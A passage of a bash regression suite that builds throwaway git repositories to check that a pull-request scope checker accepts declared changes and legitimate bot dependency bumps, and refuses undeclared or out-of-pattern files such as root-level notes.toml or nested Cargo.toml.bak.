printf 'orig\n' > "$D60/src/keep.rs"
commit_all "$D60" base
git -C "$D60" checkout -qb pr
printf 'evil\n' > "$D60/src/evil.rs"
commit_all "$D60" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `src/keep.rs` | modify | the one real, properly backticked, declared file |
| src/evil.rs | modify | NOT backticked; belongs to some other table shape, must be skipped |
'
echo "== an unbackticked Files-table cell must not be treated as a declared path =="
OUT60="$(run_scope "$D60")" && RC60=0 || RC60=$?
if [ "$RC60" -eq 0 ]; then
  echo "FAIL: case 60 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT60" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT60" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: src/evil.rs, declared only via an unbackticked cell, was reported as matching. Got:"
  echo "$OUT60" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT60" | grep -qF 'src/evil.rs'; then
  echo "FAIL: refused, but src/evil.rs was not named among the undeclared paths. Got:"
  echo "$OUT60" | sed 's/^/    /'
  FAILED=1
else
  note "an unbackticked Files-table cell is skipped, not treated as a declared path"
fi

# ---------------------------------------------------------------------------
# 61. POSITIVE CONTROL: a `[target.'cfg(windows)'.build-dependencies]` string
#     bump must stay EXEMPT. Case 36b already covers the target-cfg variant
#     of `dev-dependencies`; nothing covers the target-cfg variant of
#     `build-dependencies`, so dropping `build-dependencies` from
#     `DEP_TABLE_NAMES` (which only gates the target-cfg branch of
#     `is_dep_table_path`; the plain `[build-dependencies]` table case 36
#     covers is a separate, hardcoded tuple entry) is invisible.
# ---------------------------------------------------------------------------
D61="$WORK/target-cfg-build-dependencies-string-bump"
new_repo "$D61"
mkdir -p "$D61/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[target.\x27cfg(windows)\x27.build-dependencies]\ncc = "1.0"\n' > "$D61/crates/pol/Cargo.toml"
commit_all "$D61" base
git -C "$D61" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[target.\x27cfg(windows)\x27.build-dependencies]\ncc = "1.1"\n' > "$D61/crates/pol/Cargo.toml"
commit_all "$D61" "chore(deps): bump cc"
fake_gh 'dependabot[bot]' ''
echo "== a target.'cfg(windows)'.build-dependencies string bump must stay EXEMPT =="
OUT61="$(run_scope "$D61")" && RC61=0 || RC61=$?
if [ "$RC61" -ne 0 ]; then
  echo "FAIL: case 61 was expected to pass (rc=0) but exited non-zero (rc=$RC61)." >&2
  echo "$OUT61" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT61" | grep -qF 'pr-scope-check: EXEMPT'; then
  note "a target-specific build-dependencies string bump stays EXEMPT"
else
  echo "FAIL: a target.'cfg(windows)'.build-dependencies string bump was refused. Got:"
  echo "$OUT61" | sed 's/^/    /'
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 62. POSITIVE CONTROL: `renovate[bot]`, one of the three trusted logins in
#     the author case arm, must actually be recognised. No case exercised
#     this login; only `dependabot[bot]` had positive coverage.
# ---------------------------------------------------------------------------
D62="$WORK/renovate-bot-recognised"
new_repo "$D62"
mkdir -p "$D62/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\n' > "$D62/crates/pol/Cargo.toml"
commit_all "$D62" base
git -C "$D62" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.1"\n' > "$D62/crates/pol/Cargo.toml"
commit_all "$D62" "chore(deps): bump serde"
fake_gh 'renovate[bot]' ''
echo "== renovate[bot] must take the bot-exempt path for a legitimate bump =="
OUT62="$(run_scope "$D62")" && RC62=0 || RC62=$?
if [ "$RC62" -ne 0 ]; then
  echo "FAIL: case 62 was expected to pass (rc=0) but exited non-zero (rc=$RC62)." >&2
  echo "$OUT62" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT62" | grep -qF 'pr-scope-check: EXEMPT'; then
  note "renovate[bot] is recognised and a legitimate bump stays EXEMPT"
else
  echo "FAIL: a legitimate renovate[bot] bump was refused. Got:"
  echo "$OUT62" | sed 's/^/    /'
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 63. POSITIVE CONTROL: `github-actions[bot]`, the third trusted login, must
#     also be recognised, bumping a workflow file (its realistic payload).
# ---------------------------------------------------------------------------
D63="$WORK/github-actions-bot-recognised"
new_repo "$D63"
mkdir -p "$D63/.github/workflows"
printf 'name: ci\non: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n' > "$D63/.github/workflows/ci.yml"
commit_all "$D63" base
git -C "$D63" checkout -qb pr
printf 'name: ci\non: push\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n' > "$D63/.github/workflows/ci.yml"
commit_all "$D63" "chore: bump actions/checkout"
fake_gh 'github-actions[bot]' ''
echo "== github-actions[bot] must take the bot-exempt path for a workflow bump =="
OUT63="$(run_scope "$D63")" && RC63=0 || RC63=$?
if [ "$RC63" -ne 0 ]; then
  echo "FAIL: case 63 was expected to pass (rc=0) but exited non-zero (rc=$RC63)." >&2
  echo "$OUT63" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT63" | grep -qF 'pr-scope-check: EXEMPT'; then
  note "github-actions[bot] is recognised and a workflow bump stays EXEMPT"
else
  echo "FAIL: a legitimate github-actions[bot] workflow bump was refused. Got:"
  echo "$OUT63" | sed 's/^/    /'
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 64. POSITIVE CONTROL: the closing-keyword regex's `resolve[sd]?` alternative
#     must actually be recognised. Every other non-bot case in this file uses
#     "Closes #NN"; nothing exercises "Resolves #NN".
# ---------------------------------------------------------------------------
D64="$WORK/resolves-keyword-recognised"
new_repo "$D64"
mkdir -p "$D64/src"
printf 'orig\n' > "$D64/src/lib.rs"
commit_all "$D64" base
git -C "$D64" checkout -qb pr
printf 'changed\n' > "$D64/src/lib.rs"
commit_all "$D64" implement
fake_gh 'coder-agent' 'Resolves #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `src/lib.rs` | modify | the declared file |
'
echo "== 'Resolves #NN' must be recognised as a closing keyword =="
OUT64="$(run_scope "$D64")" && RC64=0 || RC64=$?
if [ "$RC64" -ne 0 ]; then
  echo "FAIL: case 64 was expected to pass (rc=0) but exited non-zero (rc=$RC64)." >&2
  echo "$OUT64" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT64" | grep -qF 'pr-scope-check: the diff matches issue #42'; then
  note "'Resolves #NN' is recognised as a closing keyword"
else
  echo "FAIL: a PR body using 'Resolves #42' was not recognised. Got:"
  echo "$OUT64" | sed 's/^/    /'
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 65. POSITIVE CONTROL: the non-bot nested-lockfile sibling exemption must
#     actually forgive a real, undeclared `crates/<n>/fuzz/Cargo.lock` change
#     when its sibling manifest IS declared (even though the diff itself does
#     not touch that manifest, a real "the fuzz crate's own dependency
#     resolution shifted" bump). Cases 42/46/46/51 above only exercise the
#     REFUSAL side of this rule; nothing exercised the EXEMPTION it exists to
#     grant, so a plain narrowing or disabling of the exemption (independent
#     of any word-splitting trick) would silently start refusing every real
#     fuzz-lockfile-only bump and nothing here would notice.
# ---------------------------------------------------------------------------
D65="$WORK/nested-lockfile-sibling-exemption-plain-positive"
new_repo "$D65"
mkdir -p "$D65/crates/pol/fuzz/fuzz_targets"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D65/crates/pol/Cargo.toml"
printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\n\n[workspace]\n\n[dependencies]\nlibfuzzer-sys="0.4"\n\n[[bin]]\nname="t"\npath="fuzz_targets/t.rs"\n' > "$D65/crates/pol/fuzz/Cargo.toml"
printf '#![no_main]\n' > "$D65/crates/pol/fuzz/fuzz_targets/t.rs"
printf 'placeholder\n' > "$D65/crates/pol/fuzz/Cargo.lock"
commit_all "$D65" base
git -C "$D65" checkout -qb pr
printf 'resolved differently, same manifest text\n' > "$D65/crates/pol/fuzz/Cargo.lock"
commit_all "$D65" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `crates/pol/fuzz/Cargo.toml` | modify | the fuzz crate manifest, declared even though this diff only moved its lockfile |
'
echo "== a nested fuzz lockfile change must be EXEMPT when its own sibling manifest is genuinely declared =="
OUT65="$(run_scope "$D65")" && RC65=0 || RC65=$?
if [ "$RC65" -ne 0 ]; then
  echo "FAIL: case 65 was expected to pass (rc=0) but exited non-zero (rc=$RC65)." >&2
  echo "$OUT65" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT65" | grep -qF 'pr-scope-check: the diff matches issue'; then
  note "a nested fuzz lockfile change is forgiven when its own sibling manifest is declared"
else
  echo "FAIL: a legitimate nested fuzz lockfile change, with its sibling declared, was refused. Got:"
  echo "$OUT65" | sed 's/^/    /'
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 66. POSITIVE CONTROL: cargo_lock_exempt must actually forgive the ROOT
#     Cargo.lock when a NESTED crate's Cargo.toml (not the root manifest) is
#     the declared, changed file. Case 6 (issue #836's own motivation)
#     exercises a nested crate manifest bump but does not also touch the root
#     Cargo.lock; nothing here confirms the tie actually reaches a nested
#     manifest rather than only the root one.
# ---------------------------------------------------------------------------
D66="$WORK/cargo-lock-exempt-nested-manifest-plain-positive"
new_repo "$D66"
mkdir -p "$D66/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\n' > "$D66/crates/pol/Cargo.toml"
printf 'placeholder\n' > "$D66/Cargo.lock"
commit_all "$D66" base
git -C "$D66" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\nlog = "0.4"\n' > "$D66/crates/pol/Cargo.toml"
printf 'bumped\n' > "$D66/Cargo.lock"
commit_all "$D66" "add log dependency"
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `crates/pol/Cargo.toml` | modify | add the log dependency |
'
echo "== the root Cargo.lock must be forgiven when a DECLARED, CHANGED nested manifest triggered it =="
OUT66="$(run_scope "$D66")" && RC66=0 || RC66=$?
if [ "$RC66" -ne 0 ]; then
  echo "FAIL: case 66 was expected to pass (rc=0) but exited non-zero (rc=$RC66)." >&2
  echo "$OUT66" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT66" | grep -qF 'pr-scope-check: the diff matches issue'; then
  note "root Cargo.lock is forgiven when a declared, changed nested manifest is its plausible trigger"
else
  echo "FAIL: root Cargo.lock was refused even though a declared, changed nested manifest is its plausible trigger. Got:"
  echo "$OUT66" | sed 's/^/    /'
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 67. POSITIVE CONTROL: a declared entry ending in `/` must actually cover a
#     file underneath it, in the MAIN undeclared loop. No case exercised the
#     accept side of the directory-declaration feature the script documents
#     at line 800; only its absence (an ordinary undeclared file) is implied
#     by every other case's exact-match fixtures.
# ---------------------------------------------------------------------------
D67="$WORK/directory-declaration-undeclared-loop-plain-positive"
new_repo "$D67"
mkdir -p "$D67/crates/pol/src"
printf 'orig\n' > "$D67/crates/pol/src/lib.rs"
commit_all "$D67" base
git -C "$D67" checkout -qb pr
printf 'changed\n' > "$D67/crates/pol/src/lib.rs"
commit_all "$D67" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `crates/pol/` | modify | the whole crate tree, declared as a directory |
'
echo "== a directory declaration (trailing slash) must cover a file underneath it =="
OUT67="$(run_scope "$D67")" && RC67=0 || RC67=$?
if [ "$RC67" -ne 0 ]; then
  echo "FAIL: case 67 was expected to pass (rc=0) but exited non-zero (rc=$RC67)." >&2
  echo "$OUT67" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT67" | grep -qF 'pr-scope-check: the diff matches issue'; then
  note "a directory declaration covers a file underneath it in the main undeclared loop"
else
  echo "FAIL: a file under a directory-declared path was refused as undeclared. Got:"
  echo "$OUT67" | sed 's/^/    /'
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 68. POSITIVE CONTROL: a declared entry ending in `/` must also feed
#     cargo_lock_exempt, not only the main undeclared loop. A nested crate's
#     Cargo.toml, covered ONLY by a directory declaration (no exact-path row
#     anywhere), is changed alongside the root Cargo.lock.
# ---------------------------------------------------------------------------
D68="$WORK/directory-declaration-cargo-lock-exempt-plain-positive"
new_repo "$D68"
mkdir -p "$D68/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\n' > "$D68/crates/pol/Cargo.toml"
printf 'placeholder\n' > "$D68/Cargo.lock"
commit_all "$D68" base
git -C "$D68" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\nlog = "0.4"\n' > "$D68/crates/pol/Cargo.toml"
printf 'bumped\n' > "$D68/Cargo.lock"
commit_all "$D68" "add log dependency"
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `crates/pol/` | modify | the whole crate tree, declared as a directory, no exact Cargo.toml row |
'
echo "== a directory declaration must also feed cargo_lock_exempt, forgiving the root Cargo.lock =="
OUT68="$(run_scope "$D68")" && RC68=0 || RC68=$?
if [ "$RC68" -ne 0 ]; then
  echo "FAIL: case 68 was expected to pass (rc=0) but exited non-zero (rc=$RC68)." >&2
  echo "$OUT68" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT68" | grep -qF 'pr-scope-check: the diff matches issue'; then
  note "a directory declaration feeds cargo_lock_exempt, forgiving the root Cargo.lock"
else
  echo "FAIL: root Cargo.lock was refused even though its manifest is covered by a directory declaration. Got:"
  echo "$OUT68" | sed 's/^/    /'
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 69. POSITIVE CONTROL: ALWAYS_ALLOWED must actually exempt CHANGELOG.md from
#     needing its own Files row. Every other case's issue either does not
#     touch CHANGELOG.md at all, or declares it explicitly; nothing confirms
#     the blanket exemption itself does anything.
# ---------------------------------------------------------------------------
D69="$WORK/always-allowed-changelog-plain-positive"
new_repo "$D69"
mkdir -p "$D69/docs"
printf 'orig\n' > "$D69/docs/other.md"
commit_all "$D69" base
git -C "$D69" checkout -qb pr
printf '# Changelog\n\n## 0.2.0\n- did a thing\n' > "$D69/CHANGELOG.md"
commit_all "$D69" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `docs/other.md` | modify | an unrelated declared file this diff does not touch, so the Files table is non-empty |
'
echo "== CHANGELOG.md must be exempt without its own Files row =="
OUT69="$(run_scope "$D69")" && RC69=0 || RC69=$?
if [ "$RC69" -ne 0 ]; then
  echo "FAIL: case 69 was expected to pass (rc=0) but exited non-zero (rc=$RC69)." >&2
  echo "$OUT69" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT69" | grep -qF 'pr-scope-check: the diff matches issue'; then
  note "CHANGELOG.md is exempt from needing its own Files row"
else
  echo "FAIL: an undeclared CHANGELOG.md change was refused even though ALWAYS_ALLOWED should exempt it. Got:"
  echo "$OUT69" | sed 's/^/    /'
  FAILED=1
fi


# ===========================================================================
# ROUND EIGHT. The round-seven review swept every element-expansion site in
# the loops (cases 1 through 69 already exercise the array-quoting class
# exhaustively) and found the identical "pinned the named mutant, not its
# class" shape one line below the loops, in BOT_ALLOWED itself: only the
# overall `^`/`$` anchors and the one `[^/]+` component boundary case 4 pins
# (crates/[^/]+/Cargo\.toml not crossing a `/`) had any test standing behind
# them. Five of the eight alternatives (Cargo\.toml, Cargo\.lock,
# crates/[^/]+/Cargo\.toml, crates/[^/]+/fuzz/Cargo\.lock, and
# packages/[^/]+/package(-lock)?\.json) had NO alternative-specific pinning
# at all beyond those shared anchors; the other three
# (crates/[^/]+/fuzz/Cargo\.toml, \.github/workflows/[^/]+\.ya?ml, and
# \.github/dependabot\.yml) had a mutant PROVEN to survive by the reviewer
# but no case landed to close it. Cases 70 through 88 below sweep every one
# of the eight alternatives: each widens exactly one literal path component,
# filename, or extension token to a wildcard and pins a fixture that the
# real regex refuses and the widened one would not. Where more than one
# token in an alternative is independently widenable, more than one case is
# added; where a widening is already caught by an existing case reached
# through the shared `$` anchor (relaxing either root alternative's
# extension to `.+` is killed by case 5's `Cargo.toml.bak`, since alternation
# does not care which branch matched), no redundant case is added, and that
# is noted in the round's own evidence rather than asserted here.
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# 70. BOT_ALLOWED sweep, Cargo\.toml (root), name token. Widening `Cargo` to
#     `[^/]+` (`[^/]+\.toml`) would admit any root-level *.toml file, not
#     only the real manifest. A bot PR introducing a NEW root file that is
#     not literally Cargo.toml must be refused.
# ---------------------------------------------------------------------------
D70="$WORK/bot-allowed-a1-name-token"
new_repo "$D70"
printf '[workspace]\nmembers=[]\n' > "$D70/Cargo.toml"
commit_all "$D70" base
git -C "$D70" checkout -qb pr
printf 'not the workspace manifest\n' > "$D70/notes.toml"
commit_all "$D70" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (Cargo\\.toml, name token): notes.toml at repo root must be refused =="
OUT70="$(run_scope "$D70")" && RC70=0 || RC70=$?
if [ "$RC70" -eq 0 ]; then
  echo "FAIL: case 70 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT70" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT70" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: notes.toml at repo root was reported EXEMPT. Got:"
  echo "$OUT70" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT70" | grep -qF 'notes.toml'; then
  echo "FAIL: refused, but notes.toml was not named among the offending paths. Got:"
  echo "$OUT70" | sed 's/^/    /'
  FAILED=1
else
  note "a root *.toml file that is not literally Cargo.toml is refused (pins the name token)"
fi

# ---------------------------------------------------------------------------
# 71. BOT_ALLOWED sweep, Cargo\.lock (root), name token. Same shape as 70,
#     for the lockfile alternative: widening `Cargo` to `[^/]+` would admit
#     any root-level *.lock file.
# ---------------------------------------------------------------------------
D71="$WORK/bot-allowed-a2-name-token"
new_repo "$D71"
printf '[workspace]\nmembers=[]\n' > "$D71/Cargo.toml"
commit_all "$D71" base
git -C "$D71" checkout -qb pr
printf 'not the workspace lockfile\n' > "$D71/notes.lock"
commit_all "$D71" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (Cargo\\.lock, name token): notes.lock at repo root must be refused =="
OUT71="$(run_scope "$D71")" && RC71=0 || RC71=$?
if [ "$RC71" -eq 0 ]; then
  echo "FAIL: case 71 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT71" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT71" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: notes.lock at repo root was reported EXEMPT. Got:"
  echo "$OUT71" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT71" | grep -qF 'notes.lock'; then
  echo "FAIL: refused, but notes.lock was not named among the offending paths. Got:"
  echo "$OUT71" | sed 's/^/    /'
  FAILED=1
else
  note "a root *.lock file that is not literally Cargo.lock is refused (pins the name token)"
fi

# ---------------------------------------------------------------------------
# 72. BOT_ALLOWED sweep, crates/[^/]+/Cargo\.toml, filename token. Widening
#     the trailing `Cargo\.toml` to `[^/]+\.toml` would admit any *.toml
#     file inside a crate directory, not only its real manifest.
# ---------------------------------------------------------------------------
D72="$WORK/bot-allowed-a3-filename-token"
new_repo "$D72"
mkdir -p "$D72/crates/pol/src"
printf '[workspace]\nmembers=["crates/pol"]\n' > "$D72/Cargo.toml"
printf 'pub fn x(){}\n' > "$D72/crates/pol/src/lib.rs"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D72/crates/pol/Cargo.toml"
commit_all "$D72" base
git -C "$D72" checkout -qb pr
printf 'not the crate manifest\n' > "$D72/crates/pol/notes.toml"
commit_all "$D72" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (crates/[^/]+/Cargo\\.toml, filename token): crates/pol/notes.toml must be refused =="
OUT72="$(run_scope "$D72")" && RC72=0 || RC72=$?
if [ "$RC72" -eq 0 ]; then
  echo "FAIL: case 72 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT72" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT72" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: crates/pol/notes.toml was reported EXEMPT. Got:"
  echo "$OUT72" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT72" | grep -qF 'crates/pol/notes.toml'; then
  echo "FAIL: refused, but crates/pol/notes.toml was not named among the offending paths. Got:"
  echo "$OUT72" | sed 's/^/    /'
  FAILED=1
else
  note "a *.toml file inside a crate dir that is not literally Cargo.toml is refused (pins the filename token)"
fi

# ---------------------------------------------------------------------------
# 73. BOT_ALLOWED sweep, crates/[^/]+/Cargo\.toml, leading directory token.
#     Widening the literal `crates` directory to `[^/]+` would admit a pure
#     dependency-version bump sitting under ANY top-level directory, not
#     only `crates/`.
# ---------------------------------------------------------------------------
D73="$WORK/bot-allowed-a3-dir-token"
new_repo "$D73"
mkdir -p "$D73/vendor/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\n' > "$D73/vendor/pol/Cargo.toml"
commit_all "$D73" base
git -C "$D73" checkout -qb pr
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.1"\n' > "$D73/vendor/pol/Cargo.toml"
commit_all "$D73" "chore(deps): bump serde"
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (crates/[^/]+/Cargo\\.toml, dir token): vendor/pol/Cargo.toml (pure bump, wrong top dir) must be refused =="
OUT73="$(run_scope "$D73")" && RC73=0 || RC73=$?
if [ "$RC73" -eq 0 ]; then
  echo "FAIL: case 73 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT73" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT73" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: vendor/pol/Cargo.toml was reported EXEMPT. Got:"
  echo "$OUT73" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT73" | grep -qF 'vendor/pol/Cargo.toml'; then
  echo "FAIL: refused, but vendor/pol/Cargo.toml was not named among the offending paths. Got:"
  echo "$OUT73" | sed 's/^/    /'
  FAILED=1
else
  note "a pure dependency-version bump under a non-crates top directory is refused (pins the leading dir token)"
fi

# ---------------------------------------------------------------------------
# 74. BOT_ALLOWED sweep, crates/[^/]+/Cargo\.toml, extension/$ token nested.
#     Case 5 pins the `$` anchor at the root (Cargo.toml.bak); this pins the
#     identical shape one level down, where no existing case reaches: a
#     stale nested copy must not ride the widened alternative either.
# ---------------------------------------------------------------------------
D74="$WORK/bot-allowed-a3-suffix-token"
new_repo "$D74"
mkdir -p "$D74/crates/pol"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D74/crates/pol/Cargo.toml"
commit_all "$D74" base
git -C "$D74" checkout -qb pr
printf 'stale nested copy\n' > "$D74/crates/pol/Cargo.toml.bak"
commit_all "$D74" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (crates/[^/]+/Cargo\\.toml, suffix token): crates/pol/Cargo.toml.bak must be refused =="
OUT74="$(run_scope "$D74")" && RC74=0 || RC74=$?
if [ "$RC74" -eq 0 ]; then
  echo "FAIL: case 74 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT74" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT74" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: crates/pol/Cargo.toml.bak was reported EXEMPT. Got:"
  echo "$OUT74" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT74" | grep -qF 'crates/pol/Cargo.toml.bak'; then
  echo "FAIL: refused, but crates/pol/Cargo.toml.bak was not named among the offending paths. Got:"
  echo "$OUT74" | sed 's/^/    /'
  FAILED=1
else
  note "a nested Cargo.toml.bak is refused (pins the trailing \$ anchor one level below the root)"
fi

# ---------------------------------------------------------------------------
# 75. BOT_ALLOWED sweep, crates/[^/]+/fuzz/Cargo\.toml, "fuzz" directory
#     token. Widening the literal `fuzz` component to `[^/]+` would admit a
#     pure dependency-version bump under ANY second-level crate subdirectory.
# ---------------------------------------------------------------------------
D75="$WORK/bot-allowed-a4-fuzzdir-token"
new_repo "$D75"
mkdir -p "$D75/crates/pol/notfuzz"
printf '[package]\nname="pol-notfuzz"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\n' > "$D75/crates/pol/notfuzz/Cargo.toml"
commit_all "$D75" base
git -C "$D75" checkout -qb pr
printf '[package]\nname="pol-notfuzz"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.1"\n' > "$D75/crates/pol/notfuzz/Cargo.toml"
commit_all "$D75" "chore(deps): bump serde"
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (fuzz/Cargo\\.toml, fuzz-dir token): crates/pol/notfuzz/Cargo.toml (pure bump) must be refused =="
OUT75="$(run_scope "$D75")" && RC75=0 || RC75=$?
if [ "$RC75" -eq 0 ]; then
  echo "FAIL: case 75 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT75" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT75" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: crates/pol/notfuzz/Cargo.toml was reported EXEMPT. Got:"
  echo "$OUT75" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT75" | grep -qF 'crates/pol/notfuzz/Cargo.toml'; then
  echo "FAIL: refused, but crates/pol/notfuzz/Cargo.toml was not named among the offending paths. Got:"
  echo "$OUT75" | sed 's/^/    /'
  FAILED=1
else
  note "a pure bump under a non-fuzz second-level directory is refused (pins the fuzz-dir token)"
fi

# ---------------------------------------------------------------------------
# 76. BOT_ALLOWED sweep, crates/[^/]+/fuzz/Cargo\.toml, leading directory
#     token. Same shape as 73, one level deeper.
# ---------------------------------------------------------------------------
D76="$WORK/bot-allowed-a4-dir-token"
new_repo "$D76"
mkdir -p "$D76/vendor/pol/fuzz"
printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\n\n[dependencies]\nlibfuzzer-sys="0.4"\n' > "$D76/vendor/pol/fuzz/Cargo.toml"
commit_all "$D76" base
git -C "$D76" checkout -qb pr
printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\n\n[dependencies]\nlibfuzzer-sys="0.5"\n' > "$D76/vendor/pol/fuzz/Cargo.toml"
commit_all "$D76" "chore(deps): bump libfuzzer-sys"
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (fuzz/Cargo\\.toml, dir token): vendor/pol/fuzz/Cargo.toml (pure bump, wrong top dir) must be refused =="
OUT76="$(run_scope "$D76")" && RC76=0 || RC76=$?
if [ "$RC76" -eq 0 ]; then
  echo "FAIL: case 76 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT76" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT76" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: vendor/pol/fuzz/Cargo.toml was reported EXEMPT. Got:"
  echo "$OUT76" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT76" | grep -qF 'vendor/pol/fuzz/Cargo.toml'; then
  echo "FAIL: refused, but vendor/pol/fuzz/Cargo.toml was not named among the offending paths. Got:"
  echo "$OUT76" | sed 's/^/    /'
  FAILED=1
else
  note "a pure bump under a non-crates top directory is refused (pins the leading dir token)"
fi

# ---------------------------------------------------------------------------
# 77. BOT_ALLOWED sweep, crates/[^/]+/fuzz/Cargo\.toml, filename token
#     (round seven's D04, re-verified directly against a committed mutant
#     rather than trusted from the review text). Widening the trailing
#     `Cargo\.toml` to `.+\.toml` admits a file whose name is NOT literally
#     Cargo.toml, which the content-capability check at line 640 (`case "$f"
#     in Cargo.toml|*/Cargo.toml)`) never even looks at: a FULL bypass, not
#     merely a scope widening.
# ---------------------------------------------------------------------------
D77="$WORK/bot-allowed-a4-filename-token"
new_repo "$D77"
mkdir -p "$D77/crates/pol/fuzz"
